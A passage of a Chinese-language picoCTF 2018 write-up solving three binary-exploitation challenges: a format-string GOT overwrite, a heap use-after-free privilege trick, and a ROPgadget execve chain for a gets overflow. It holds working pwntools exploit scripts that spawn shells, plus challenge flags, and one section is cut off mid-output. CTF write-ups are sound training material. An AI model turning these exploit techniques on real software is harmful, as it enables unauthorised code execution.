      setresgid(v3, v3, v3);
      vuln();
      return 0;
    }
我们在vuln函数里发现存在一个格式化字符串漏洞，由于我太菜了没能想出能只用一次格式化字符串就能getshell的payload，所以就想先把puts_got改成了vuln函数的地址，让这个格式化字符串漏洞能多次触发。
我们审计过程序后能得到的大致思路为先测出偏移，修改puts_got为vuln函数地址使得漏洞能多次触发，然后通过p32(system_got)+fmt_offset来得到system的真实地址，再把system的真实地址写入printf_got，然后在下一轮循环中输入’/bin/sh’后printf(‘/bin/sh’)就相当执行了system(‘/bin/sh’)来getshell
    ➜  echo back ./echoback 
    input your message:
    aaaa%7$x
    aaaa61616161
    Thanks for sending the message!
EXP
    from pwn import*
    context(os='linux',arch='i386',log_level='debug')
    #n = process('./echoback')
    n = remote('2018shell2.picoctf.com',37402)
    elf = ELF('./echoback')
    printf_got = elf.got['printf']
    puts_got = elf.got['puts']
    system_got = elf.got['system']
    vuln_addr = 0x080485AB
    payload1 = fmtstr_payload(7,{puts_got:vuln_addr})
    n.recvuntil('message:')
    n.sendline(payload1)
    leak_payload = p32(system_got)+'%7$s'
    n.send(leak_payload)
    n.recvuntil('message:')
    system_addr = u32(n.recv()[5:9])
    print hex(system_addr)
    payload = fmtstr_payload(7,{printf_got:system_addr})
    n.sendline(payload)
    n.interactive()
###  are you root?
    ➜  are_you_root file auth 
    auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped
    ➜  are_you_root checksec auth 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/are_you_root/auth'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
源码分析过一遍后,我们锁定了几个存在漏洞可能的分支
输入用的是fgets
    if(fgets(buf, 512, stdin) == NULL)
          break;
    typedef enum auth_level {
      ANONYMOUS = 1,
      GUEST = 2,
      USER = 3,
      ADMIN = 4,
      ROOT = 5
    } auth_level_t;
    struct user {
      char *name;
      auth_level_t level;
    };
login分支
        else if (!strncmp(buf, "login", 5))
        {
          if (user != NULL)
          {
               puts("Already logged in. Reset first.");
               continue;
          }
          arg = strtok(&buf[6], "n");
          if (arg == NULL)
          {
            puts("Invalid command");
              continue;
          }
          user = (struct user *)malloc(sizeof(struct user));
          if (user == NULL) 
          {
            puts("malloc() returned NULL. Out of Memoryn");
            exit(-1);
          }
          user->name = strdup(arg);
          printf("Logged in as "%s"n", arg);
        }
reset分支
        else if(!strncmp(buf, "reset", 5))
        {
          if (user == NULL)
          {
              puts("Not logged in!");
              continue;
          }
          free(user->name);
          user = NULL;
          puts("Logged out!");
        }
我们先登陆一个name=’a’*0x10,level=3的账号，下断点看一下堆里面的分布
    gdb-peda$ parseheap
    addr                prev                size                 status              fd                bk                
    0x603000            0x0                 0x410                Used                None              None
    0x603410            0x0                 0x20                 Used                None              None
    0x603430            0x0                 0x20                 Used                None              None
    gdb-peda$ x/8x 0x603410
    0x603410:    0x0000000000000000             0x0000000000000021
    0x603420:    0x0000000000603440  ')
        n.sendline('reset')
    def login(name):
        n.recvuntil('> ')
        n.sendline('login '+name)
    def getflag():
        n.sendline('get-flag')
    payload = 'a'*8+p64(5)
    login(payload)
    gdb.attach(n)
    reset()
    login('Ep3ius')
    getflag()
    n.interactive()
FLAG
    picoCTF{m3sS1nG_w1tH_tH3_h43p_bc7d345a}
###  can-you-gets-me
    ➜  can-you-gets-me file gets 
    gets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped
    ➜  can-you-gets-me checksec gets 
    [*] '/home/Ep3ius/pwn/process/picoCTF2018/can-you-gets-me/gets'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BUFSIZE 16
    void vuln() {
      char buf[16];
      printf("GIVE ME YOUR NAME!n");
      return gets(buf);
    }
    int main(int argc, char **argv){
      setvbuf(stdout, NULL, _IONBF, 0);
      // Set the gid to the effective gid
      // this prevents /bin/sh from dropping the privileges
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
      vuln();
    }
看了一波源码，只给了一个gets和printf，一开始我还想说是不是用ret2dl-resolve，后来肝了一天都没肝出，查报错的时候发现没办法找到plt表，就在想这个会不会是静态编译的文件，就用ldd检查了下
    ➜  can-you-gets-me ldd gets
        不是动态可执行文件
    ➜  can-you-gets-me
emmmm，居然还真是静态库编译的那么我们试试用ropgadget的ropchain来构造ROP链玄学一键getshell
    ROPgadget --binary gets --ropchain
    - Step 5 -- Build the ROP chain
        #!/usr/bin/env python2
        # execve generated by ROPgadget
        from struct import pack
        # Padding goes here
        p = ''
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea060) # @ .data
        p += pack('<I', 0x080b81c6) # pop eax ; ret
        p += '/bin'
        p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea064) # @ .data + 4
        p += pack('<I', 0x080b81c6) # pop eax ; ret
        p += '//sh'
        p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea068) # @ .data + 8
        p += pack('<I', 0x08049303) # xor eax, eax ; ret
        p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080481c9) # pop ebx ; ret
        p += pack('<I', 0x080ea060) # @ .data
        p += pack('<I', 0x080de955) # pop ecx ; ret
        p += pack('<I', 0x080ea068) # @ .data + 8
        p += pack('<I', 0x0806f02a) # pop edx ; ret
        p += pack('<I', 0x080ea068) # @ .data + 8
        p += pack('<I', 0x08049303) # xor eax, eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0807a86f) # inc eax ; ret
        p += pack('<I', 0x0806cc25) # int 0x80
    ➜  can-you-gets-me
结果确实只要溢出后执行就能getshell了
EXP
    from pwn import*
    from struct import pack
    n = process('./gets')
    # Padding goes here
    p = 'a'*0x18 + 'aaaa'        # buf 
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080b81c6) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea064) # @ .data + 4
    p += pack('<I', 0x080b81c6) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x08049303) # xor eax, eax ; ret
    p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080de955) # pop ecx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x08049303) # xor eax, eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0806cc25) # int 0x80
    n.recvuntil('NAME!')
    n.sendline(p)
    n.interactive()
FLAG
    picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}